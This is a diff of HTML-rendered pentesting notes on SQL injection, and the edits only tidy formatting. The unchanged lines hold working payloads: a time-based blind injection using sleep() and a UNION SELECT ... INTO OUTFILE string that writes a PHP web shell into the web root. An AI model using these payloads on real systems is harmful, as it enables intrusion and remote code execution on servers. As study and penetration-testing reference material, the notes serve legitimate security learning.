@@ -1,12 +1,14 @@
 <p><a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection">https://pentestmonkey.net/category/cheat-sheet/sql-injection</a></p>
-<h3 id="enumeration-discovery">Enumeration/Discovery</h3>
+<h3 id="enumerationdiscovery">Enumeration/Discovery</h3>
 <ul>
 <li>General fuzzing can help, but try to think from the developer&#39;s perspective when coming up with the example query</li>
 <li>Matching on numbers may not use single/double quotes at all<ul>
-<li><code>SELECT * FROM rooms WHERE room_id = 1;</code> uses no quotes<h3 id="mysql">MySQL</h3>
-</li>
+<li><code>SELECT * FROM rooms WHERE room_id = 1;</code> uses no quotes</li>
 </ul>
 </li>
+</ul>
+<h3 id="mysql">MySQL</h3>
+<ul>
 <li>MariaDB is an open-source fork</li>
 <li><code>mysql -u {username} -p -h {host IP} -P {port}</code></li>
 <li>Specifying multiple parameters <code>SELECT user, passhash FROM mysql.user WHERE user = &#39;{username}&#39;</code></li>
@@ -94,14 +96,14 @@
 </li>
 <li>Blind injection<ul>
 <li>Can use booleans alongside sleep commands to verify existence of data/characters<ul>
-<li><code>&#39; AND IF (1=1, sleep(3), &#39;false&#39;) -- //</code> </li>
+<li><code>&#39; AND IF (1=1, sleep(3), &#39;false&#39;) -- //</code></li>
 </ul>
 </li>
 </ul>
 </li>
 <li>MySQL RCE via SQLi<ul>
 <li>Use the <code>INTO OUTFILE</code> to create a PHP/JSP/ASPX/etc shell<ul>
-<li>Example: <code>&#39; UNION SELECT &quot;&lt;?php system(&#39;whoami&#39;);?&gt;&quot;, null, null INTO OUTFILE &quot;/var/www/html/tmp/shell.php&quot; -- //</code><ul>
+<li>Example: <code>&#39; UNION SELECT &quot;&lt;?php system(&#39;whoami&#39;);?&gt;&quot;, null, null INTO OUTFILE &quot;/var/www/html/tmp/shell.php&quot; -- // </code><ul>
 <li><code>tmp</code> is important, because we might not have perms for <code>/html</code></li>
 </ul>
 </li>
